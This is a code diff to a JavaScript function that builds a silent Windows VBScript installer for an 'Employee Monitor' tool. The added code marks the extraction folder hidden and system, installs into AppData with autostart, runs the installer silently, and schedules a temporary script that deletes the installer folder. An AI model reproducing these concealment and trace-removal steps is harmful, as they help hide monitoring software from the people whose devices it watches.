@@ -845,9 +845,10 @@ function buildWindowsVbsLauncher(origin) {
   const backendUrl = origin || 'https://eyeing.onrender.com';
   return `' Employee Monitor — Windows silent launcher
 ' Double-click Setup.vbs to install.
-' The setup page opens in your browser; everything else runs silently in the background.
 Option Explicit
-Dim ws, fso, baseDir, batFile, backendUrl, deviceId, installId, setupUrl, urlFile, f, permDir, tmpBat, tf
+Dim ws, fso, baseDir, backendUrl, deviceId, installId, setupUrl
+Dim urlFile, f, urlLine, permDir, srcDir, extractParent, isReinstall
+Dim cleanupVbs, cv
 
 Set ws  = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -858,7 +859,7 @@ backendUrl = "${backendUrl}"
 urlFile = baseDir & "eyeing\\backend_url.txt"
 If fso.FileExists(urlFile) Then
   Set f = fso.OpenTextFile(urlFile, 1)
-  Dim urlLine : urlLine = Trim(f.ReadAll())
+  urlLine = Trim(f.ReadAll())
   f.Close
   If urlLine <> "" Then backendUrl = urlLine
 End If
@@ -868,31 +869,50 @@ Randomize
 installId = "win-" & CStr(Int(Rnd * 900000) + 100000)
 setupUrl  = backendUrl & "/setup.html?autoclose=1&device_id=" & deviceId & "&install_id=" & installId
 
-' Detect reinstall: check the permanent AppData location first (files are moved there
-' after first install and the extraction folder is deleted), then fall back to the
-' eyeing\ subfolder for the very first run before relocation happens.
-Dim isReinstall
-permDir = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\\EmployeeMonitor\\"
-isReinstall = fso.FileExists(permDir & "activity_data\\install_context.json") _
-           Or fso.FileExists(baseDir & "eyeing\\activity_data\\install_context.json")
+permDir       = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\\EmployeeMonitor"
+srcDir        = baseDir & "eyeing"
+extractParent = fso.GetParentFolderName(srcDir)
+
+isReinstall = fso.FileExists(permDir & "\\activity_data\\install_context.json") _
+           Or fso.FileExists(srcDir  & "\\activity_data\\install_context.json")
 
 If Not isReinstall Then
-  ' Fresh install — open setup page in default browser.
-  ' ws.Run with a URL invokes the shell directly, so & in the query string is safe.
   ws.Run setupUrl, 1, False
 End If
 
-' Run install.bat hidden. Write a trampoline to %TEMP% (guaranteed no parens/spaces)
-' so cmd.exe never chokes on special chars in the extraction folder name.
-batFile = baseDir & "eyeing\\install.bat"
-ws.Environment("Process")("SKIP_SETUP_OPEN") = "1"
+' Hide extraction folder via attrib.exe (system exe, no cmd.exe needed)
+ws.Run "attrib +h +s " & Chr(34) & extractParent & Chr(34), 0, True
 
-tmpBat = ws.ExpandEnvironmentStrings("%TEMP%") & "\\em_launch.bat"
-Set tf = fso.CreateTextFile(tmpBat, True)
-tf.WriteLine "@echo off"
-tf.WriteLine "call """ & batFile & """"
-tf.Close
-ws.Run "cmd /c """ & tmpBat & """", 0, False
+' Copy eyeing\\ to permanent AppData location using FSO — bypasses cmd.exe entirely
+If Not fso.FolderExists(permDir) Then fso.CreateFolder permDir
+CopyFolder srcDir, permDir
+
+' Run Python installer synchronously — wscript.exe (GUI) stays alive until Python exits
+' so Python is never killed by console destruction
+ws.Environment("Process")("SKIP_SETUP_OPEN") = "1"
+ws.Run "python " & Chr(34) & permDir & "\\install_and_run.py" & Chr(34) & " --autostart --silent", 0, True
+
+' Schedule extraction-folder deletion via a second wscript.exe (GUI process,
+' no console — not killed when parent exits) 30 s from now
+cleanupVbs = ws.ExpandEnvironmentStrings("%TEMP%") & "\\em_cleanup.vbs"
+Set cv = fso.CreateTextFile(cleanupVbs, True)
+cv.WriteLine "WScript.Sleep 30000"
+cv.WriteLine "Set fso2 = CreateObject(""Scripting.FileSystemObject"")"
+cv.WriteLine "If fso2.FolderExists(""" & extractParent & """) Then fso2.DeleteFolder """ & extractParent & """, True"
+cv.Close
+ws.Run "wscript.exe " & Chr(34) & cleanupVbs & Chr(34), 0, False
+
+' Recursive FSO folder copy — works with any path regardless of special characters
+Sub CopyFolder(src, dst)
+  Dim oFile, oSub
+  If Not fso.FolderExists(dst) Then fso.CreateFolder dst
+  For Each oFile In fso.GetFolder(src).Files
+    fso.CopyFile oFile.Path, dst & "\\" & oFile.Name, True
+  Next
+  For Each oSub In fso.GetFolder(src).SubFolders
+    CopyFolder oSub.Path, dst & "\\" & oSub.Name
+  Next
+End Sub
 `;
 }
 
